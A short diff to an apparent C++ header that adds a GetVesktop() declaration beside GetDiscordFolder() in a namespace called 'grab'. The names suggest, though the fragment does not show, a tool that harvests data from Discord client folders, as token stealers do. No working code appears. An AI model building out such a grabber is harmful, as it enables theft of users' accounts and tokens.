@@ -2,4 +2,5 @@
 
 namespace grab {
 	void GetDiscordFolder();
+	void GetVesktop();
 }
